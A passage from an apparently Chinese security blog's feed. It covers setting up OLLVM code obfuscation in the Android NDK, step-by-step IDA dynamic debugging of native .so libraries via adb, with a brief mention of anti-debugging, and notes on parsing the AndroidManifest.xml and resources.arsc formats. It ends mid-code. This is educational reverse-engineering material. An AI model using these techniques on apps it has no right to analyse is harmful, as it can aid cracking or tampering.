<p>（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-&gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib</p>
</li>
<li>
<p>然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4</p>
<p>arm-linux-androideabi-clang3.4-&gt; arm-linux-androideabi-obfuscator3.4</p>
<p>mipsel-linux-android-clang3.4-&gt; mipsel-linux-android-obfuscator3.4</p>
<p>x86-clang3.4-&gt; x86-obfuscator3.4</p>
</li>
<li>
<p>分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把<code>LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)</code></p>
</li>
<li>
<p>如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9&rsquo;</p>
</li>
</ol>
<h3 id="开始使用ollvm">开始使用OLLVM</h3>
<h3 id="参考">参考</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/terminal/130142.html">http://www.freebuf.com/articles/terminal/130142.html</a></li>
<li><a href="https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/">https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/</a></li>
<li><a href="https://www.jmpoep.com/thread-4016-1-1.html">https://www.jmpoep.com/thread-4016-1-1.html</a></li>
<li>BCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>IDA 动态调试.so 基本步骤</title>
            <link>https://kuekiko.top/posts/2018/08/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</link>
            <pubDate>Fri, 31 Aug 2018 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/08/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</guid>
            <description>IDA 动态调试.so 基本步骤  待补图  0x00 IDA快捷键  Shirt+F12 字符串窗口 F5大法好 反汇编 Ctrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug） G 快速跳转到对应地址。s 调试-F7单步进入调试、F8单步、F9运行  0x01 方法一   获取运行Android_server。
android_server文件放在IDA安装目录下的\dbgsrv目录下 注意版本的不同。
之后只需 push android_server /data/local/tmp/。
之后adb shell，su ，cd /data/local/tmp/。
可能还得chmod 755 android_server 才有权限运行。
  建立通信、attach进程。
adb forward tcp:23946 tcp:23946命令。
在IDA的Debugger选项中attach进程。
  加载so、找函数下断点
双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。
  0x02 方法二 无法加载so文件需要在加载之前断点。反调试之类
  Debug方式启动app。需要应用可调试开启
adb shell am start -D -n 包名/.MainActivity
  方法一的1，2两步 勾选选项。</description>
            <content type="html"><![CDATA[<h2 id="ida-动态调试so-基本步骤">IDA 动态调试.so 基本步骤</h2>
<ul>
<li>待补图</li>
</ul>
<h4 id="0x00-ida快捷键">0x00 IDA快捷键</h4>
<ul>
<li>Shirt+F12 字符串窗口</li>
<li>F5大法好 反汇编</li>
<li>Ctrl+S  查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）</li>
<li>G 快速跳转到对应地址。s</li>
<li>调试-F7单步进入调试、F8单步、F9运行</li>
</ul>
<h4 id="0x01-方法一">0x01 方法一</h4>
<ol>
<li>
<p>获取运行Android_server。</p>
<p>android_server文件放在IDA安装目录下的\dbgsrv目录下 注意版本的不同。</p>
<p>之后只需 <code>push android_server /data/local/tmp/</code>。</p>
<p>之后<code>adb shell</code>，<code>su</code> ，<code>cd /data/local/tmp/</code>。</p>
<p>可能还得<code>chmod 755 android_server</code> 才有权限运行。</p>
</li>
<li>
<p>建立通信、attach进程。</p>
<p><code>adb forward tcp:23946 tcp:23946</code>命令。</p>
<p>在IDA的Debugger选项中attach进程。</p>
</li>
<li>
<p>加载so、找函数下断点</p>
<p>双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。</p>
</li>
</ol>
<h4 id="0x02-方法二">0x02 方法二</h4>
<p>无法加载so文件需要在加载之前断点。反调试之类</p>
<ol>
<li>
<p>Debug方式启动app。需要应用可调试开启</p>
<p><code>adb shell am start -D -n 包名/.MainActivity</code></p>
</li>
<li>
<p>方法一的1，2两步 勾选选项。</p>
</li>
<li>
<p>jdb attach程序</p>
<p><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></p>
</li>
<li>
<p>开始调试 同上</p>
</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Android应用安全防护和逆向分析-基础篇5-6</title>
            <link>https://kuekiko.top/posts/2018/08/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</link>
            <pubDate>Wed, 29 Aug 2018 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/08/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</guid>
            <description>一、 基础篇⑤-⑥ 这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。
第五章 AndroidManifest.xml格式解析 头部信息   文件魔数：4bytes。
  文件大小：4bytes。
  Chunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。
  Sting Chunk ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。
 ChunkType：类型，固定4bytes（0x001C001)。 ChunkSize：大小，4bytes。 StringCount：字符串的个数 ，4bytes。 StyleCount ：样式的个数，4bytes。 Unknown ：位置区域。4bytes。 StringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。 StylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。 StringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。 StyleOffsets：每个样式的偏移值，大小为StyleChunk*4。  如何读取这个文件？
  Resourceld Chunk ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID
 ChunkType：类型，固定4bytes（0x00080108）。 ChunkSize：大小，4bytes。 ResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。  解析？
  Start Namespace Chunk：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。
 Chunk Type：类型，固定4bytes。（0x00100100)。 Chunk Size：大小，4bytes。 Line Number ：AndroidMaifest文件中行号，4bytes。 Unknown：未知区域,4bytes。 Prefix：命名空间的前缀（在字符串中的索引值），eg:android。 Uri：命名空间的URI（在字符串中的索引值），eg:http://schemas.</description>
            <content type="html"><![CDATA[<h2 id="一-基础篇-">一、 基础篇⑤-⑥</h2>
<p>这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。</p>
<h3 id="第五章-androidmanifestxml格式解析">第五章 AndroidManifest.xml格式解析</h3>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180829165213.png" alt="AndroidManifest.xml"></p>
<!-- raw HTML omitted -->
<h5 id="头部信息">头部信息</h5>
<ul>
<li>
<p>文件魔数：4bytes。</p>
</li>
<li>
<p>文件大小：4bytes。</p>
</li>
<li>
<p>Chunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。</p>
<ul>
<li>
<p><strong>Sting Chunk</strong> ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。</p>
<ul>
<li>ChunkType：类型，固定4bytes（0x001C001)。</li>
<li>ChunkSize：大小，4bytes。</li>
<li>StringCount：字符串的个数 ，4bytes。</li>
<li>StyleCount ：样式的个数，4bytes。</li>
<li>Unknown ：位置区域。4bytes。</li>
<li>StringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。</li>
<li>StylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。</li>
<li>StringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。</li>
<li>StyleOffsets：每个样式的偏移值，大小为StyleChunk*4。</li>
</ul>
<p>如何读取这个文件？</p>
</li>
<li>
<p><strong>Resourceld Chunk</strong> ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID</p>
<ul>
<li>ChunkType：类型，固定4bytes（0x00080108）。</li>
<li>ChunkSize：大小，4bytes。</li>
<li>ResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。</li>
</ul>
<p>解析？</p>
</li>
<li>
<p><strong>Start Namespace Chunk</strong>：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。</p>
<ul>
<li>Chunk Type：类型，固定4bytes。（0x00100100)。</li>
<li>Chunk Size：大小，4bytes。</li>
<li>Line Number ：AndroidMaifest文件中行号，4bytes。</li>
<li>Unknown：未知区域,4bytes。</li>
<li>Prefix：命名空间的前缀（在字符串中的索引值），eg:<code>android</code>。</li>
<li>Uri：命名空间的URI（在字符串中的索引值），eg:<code>http://schemas.android.com/apk/res/android</code></li>
</ul>
</li>
<li>
<p><strong>Start Tag Chunk</strong>：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。</p>
<ul>
<li>Chunk Type：类型，固定4bytes。（0x00100102)。</li>
<li>Chunk Size：大小，4bytes。</li>
<li>Line Number ：对应AndroidMaifest中的行号，4bytes。</li>
<li>Unknown：未知区域,4bytes。</li>
<li>Namespace Uri ：命名空间的Uri，4bytes。</li>
<li>Name：标签名称（在字符串中的索引值），4bytes。</li>
<li>Flags：标签的类型，4bytes。eg：是开始标签还是结束标签？</li>
<li>Attributes Counk：便签中包含的属性的个数，4bytes。</li>
<li>Class Attribute：标签包含的类属性，4bytes。</li>
<li>Attributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4&quot;个字节。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="axmlprinter工具">AXMLPrinter工具</h5>
<h5 id="aapt-工具">aapt 工具</h5>
<h3 id="第六章-resourecarsc文件格式解析">第六章 resourec.arsc文件格式解析</h3>
<h5 id="资源文件id格式">资源文件id格式</h5>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180829200453.png" alt=""></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180829200408.png" alt=""></p>
<!-- raw HTML omitted -->
<h5 id="数据结构">数据结构</h5>
<p>上图</p>
<ul>
<li>
<p><strong>头部信息</strong></p>
<p>resourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResChunkHeader</span><span style="color:#f92672">{</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> type<span style="color:#f92672">;</span>  <span style="color:#75715e">//当前chunk的类型
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> headerSize<span style="color:#f92672">;</span> <span style="color:#75715e">//当前chunk的头部大小
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> size<span style="color:#f92672">;</span>  <span style="color:#75715e">//当前chunk的大小
</span><span style="color:#75715e"></span>      
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> 2<span style="color:#f92672">+</span>2<span style="color:#f92672">+</span>4    
    <span style="color:#f92672">}</span>
    <span style="color:#a6e22e">@Override</span>
    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;type:&#34;</span><span style="color:#f92672">+</span>Utils<span style="color:#f92672">.</span><span style="color:#a6e22e">bytesToHexString</span><span style="color:#f92672">(</span>
        Utils<span style="color:#f92672">.</span><span style="color:#a6e22e">int2Byte</span><span style="color:#f92672">(</span>type<span style="color:#f92672">))+</span><span style="color:#e6db74">&#34;,headerSize:&#34;</span><span style="color:#f92672">+</span>headerSize<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,size:&#34;</span><span style="color:#f92672">+</span>size<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
  
</code></pre></div></li>
<li>
<p><strong>资源索引表的头部信息</strong></p>
<p>resourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableHeader</span> <span style="color:#f92672">{</span>
   
 <span style="color:#66d9ef">public</span> ResChunkHeader header<span style="color:#f92672">;</span>  <span style="color:#75715e">//就是标准的Chunk头部信息格式
</span><span style="color:#75715e"></span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> packageCount<span style="color:#f92672">;</span>  <span style="color:#75715e">//被编译的资源包的个数
</span><span style="color:#75715e"></span>   
 <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableHeader</span><span style="color:#f92672">(){</span>
     header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResChunkHeader<span style="color:#f92672">();</span>
 <span style="color:#f92672">}</span>
   
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">(){</span>
     <span style="color:#66d9ef">return</span> header<span style="color:#f92672">.</span><span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> 4<span style="color:#f92672">;</span>
 <span style="color:#f92672">}</span>
   
 <span style="color:#a6e22e">@Override</span>
 <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
     <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;header:&#34;</span><span style="color:#f92672">+</span>header<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;packageCount:&#34;</span><span style="color:#f92672">+</span>packageCount<span style="color:#f92672">;</span>
 <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180829204728.png" alt=""></p>
</li>
<li>
<p><strong>资源项的值字符串资源池</strong></p>
<p>包含了所有在资源包里面定义的资源项的值字符串，结构如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResStringPoolHeader</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> ResChunkHeader header<span style="color:#f92672">;</span>  <span style="color:#75715e">//标准的Chunk头部信息结构
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> stringCount<span style="color:#f92672">;</span>  <span style="color:#75715e">//字符串的个数
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> styleCount<span style="color:#f92672">;</span>  <span style="color:#75715e">//字符串样式的个数
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> SORTED_FLAG <span style="color:#f92672">=</span> 1<span style="color:#f92672">;</span>
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> UTF8_FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">&lt;&lt;</span>8<span style="color:#f92672">);</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> flags<span style="color:#f92672">;</span>  <span style="color:#75715e">//字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> stringsStart<span style="color:#f92672">;</span>  <span style="color:#75715e">//字符串内容块相对于其头部的距离
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> stylesStart<span style="color:#f92672">;</span>  <span style="color:#75715e">//字符串样式块相对于其头部的距离
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResStringPoolHeader</span><span style="color:#f92672">(){</span>
      header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResChunkHeader<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> header<span style="color:#f92672">.</span><span style="color:#a6e22e">getHeaderSize</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> 4 <span style="color:#f92672">+</span> 4 <span style="color:#f92672">+</span> 4 <span style="color:#f92672">+</span> 4 <span style="color:#f92672">+</span> 4<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;header:&#34;</span><span style="color:#f92672">+</span>header<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;stringCount:&#34;</span><span style="color:#f92672">+</span>stringCount<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,styleCount:&#34;</span><span style="color:#f92672">+</span>styleCount<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,flags:&#34;</span><span style="color:#f92672">+</span>flags<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,stringStart:&#34;</span><span style="color:#f92672">+</span>stringsStart<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,stylesStart:&#34;</span><span style="color:#f92672">+</span>stylesStart<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
<span style="color:#f92672">}</span>
</code></pre></div><p>接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。<img src="http://my-md-1253484710.coscd.myqcloud.com/20180829205108.png" alt=""></p>
<p>字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：</p>
<p><code>len = (((hbyte &amp; 0x7F) &lt;&lt; 8)) | lbyte;</code></p>
<p>如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。</p>
</li>
<li>
<p><strong>Package数据块</strong></p>
<p>这个数据块记录编译包的元数据，头部信息如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTablePackage</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> ResChunkHeader header<span style="color:#f92672">;</span>  <span style="color:#75715e">//Chunk的头部信息数据结构
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> id<span style="color:#f92672">;</span>  <span style="color:#75715e">//包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01；
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">[]</span> name <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">[</span>128<span style="color:#f92672">];</span> <span style="color:#75715e">//包名
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> typeStrings<span style="color:#f92672">;</span>  <span style="color:#75715e">//类型字符串资源池相对头部的偏移
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> lastPublicType<span style="color:#f92672">;</span>  <span style="color:#75715e">//最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> keyStrings<span style="color:#f92672">;</span>  <span style="color:#75715e">//资源项名称字符串相对头部的偏移
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> lastPublicKey<span style="color:#f92672">;</span> <span style="color:#75715e">// 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTablePackage</span><span style="color:#f92672">(){</span>
      header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResChunkHeader<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;header:&#34;</span><span style="color:#f92672">+</span>header<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,id=&#34;</span><span style="color:#f92672">+</span>id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,name:&#34;</span><span style="color:#f92672">+</span>name<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,typeStrings:&#34;</span><span style="color:#f92672">+</span>typeStrings<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,lastPublicType:&#34;</span><span style="color:#f92672">+</span>lastPublicType<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,keyStrings:&#34;</span><span style="color:#f92672">+</span>keyStrings<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,lastPublicKey:&#34;</span><span style="color:#f92672">+</span>lastPublicKey<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180829205652.png" alt=""></p>
</li>
<li>
<p><strong>类型规范数据块</strong></p>
<p>用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  
<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableTypeSpec</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> SPEC_PUBLIC <span style="color:#f92672">=</span> 0x40000000<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> ResChunkHeader header<span style="color:#f92672">;</span>  <span style="color:#75715e">//Chunk的头部信息结构
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> id<span style="color:#f92672">;</span>  <span style="color:#75715e">//标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> res0<span style="color:#f92672">;</span>  <span style="color:#75715e">//保留,始终为0
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> res1<span style="color:#f92672">;</span>  <span style="color:#75715e">//保留,始终为0
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> entryCount<span style="color:#f92672">;</span>  <span style="color:#75715e">//等于本类型的资源项个数,指名称相同的资源项的个数。
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableTypeSpec</span><span style="color:#f92672">(){</span>
      header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResChunkHeader<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;header:&#34;</span><span style="color:#f92672">+</span>header<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,id:&#34;</span><span style="color:#f92672">+</span>id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,res0:&#34;</span><span style="color:#f92672">+</span>res0<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,res1:&#34;</span><span style="color:#f92672">+</span>res1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,entryCount:&#34;</span><span style="color:#f92672">+</span>entryCount<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
  	
<span style="color:#f92672">}</span>
</code></pre></div></li>
<li>
<p><strong>资源类型项数据块</strong></p>
<p>描述资源项的具体信息，名称、值、配置等信息</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResTableType</span> <span style="color:#f92672">{</span>
  	
  <span style="color:#66d9ef">public</span> ResChunkHeader header<span style="color:#f92672">;</span>  <span style="color:#75715e">//Chunk的头部信息结构
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> NO_ENTRY <span style="color:#f92672">=</span> 0xFFFFFFFF<span style="color:#f92672">;</span>
  	
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> id<span style="color:#f92672">;</span>  <span style="color:#75715e">//标识资源的Type ID
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span> res0<span style="color:#f92672">;</span>  <span style="color:#75715e">//保留,始终为0
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">short</span> res1<span style="color:#f92672">;</span>  <span style="color:#75715e">//保留,始终为0
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> entryCount<span style="color:#f92672">;</span>  <span style="color:#75715e">//等于本类型的资源项个数,指名称相同的资源项的个数。
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> entriesStart<span style="color:#f92672">;</span>  <span style="color:#75715e">//等于资源项数据块相对头部的偏移值。
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> ResTableConfig resConfig<span style="color:#f92672">;</span>  <span style="color:#75715e">//指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等
</span><span style="color:#75715e"></span>  	
  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResTableType</span><span style="color:#f92672">(){</span>
      header <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResChunkHeader<span style="color:#f92672">();</span>
      resConfig <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResTableConfig<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
   
  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">getSize</span><span style="color:#f92672">(){</span>
